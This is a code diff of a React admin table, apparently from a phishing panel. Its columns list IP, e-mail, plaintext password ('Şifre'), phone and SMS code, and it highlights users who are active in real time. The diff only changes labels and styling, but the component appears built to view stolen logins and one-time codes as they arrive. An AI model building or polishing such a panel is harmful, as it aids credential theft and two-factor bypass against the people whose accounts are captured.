@@ -187,7 +187,7 @@ const UserTable = () => {
         <div className="relative">
           <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
           <Input
-            placeholder="Kullanıcı ara..."
+            placeholder="log ara..."
             value={searchTerm}
             onChange={(e) => setSearchTerm(e.target.value)}
             className="pl-8 w-[300px]"
@@ -231,7 +231,7 @@ const UserTable = () => {
             <TableRow>
               <TableHead>ID</TableHead>
               <TableHead>IP</TableHead>
-              <TableHead>Kullanıcı Adı</TableHead>
+              <TableHead>E-posta</TableHead>
               <TableHead>Şifre</TableHead>
               <TableHead>Telefon</TableHead>
               <TableHead>SMS Kod</TableHead>
@@ -244,7 +244,7 @@ const UserTable = () => {
             {filteredUsers.map((user) => (
               <TableRow 
                 key={user.id}
-                className={activeUsers.includes(user.ipAddress) ? 'bg-green-50' : ''}
+                className={activeUsers.includes(user.ipAddress) ? 'bg-green-200' : ''}
               >
                 <TableCell>{user.id}</TableCell>
                 <TableCell>{user.ipAddress}</TableCell>
@@ -263,7 +263,7 @@ const UserTable = () => {
                       }}
                       className="text-sm p-1 bg-blue-500 text-white rounded-md hover:bg-blue-600"
                     >
-                      <Plus className="h-4 w-4" />
+                      <Plus className="h-6 w-6" />
                     </button>
                     <button
                       onClick={() => handleDelete(user.id)}
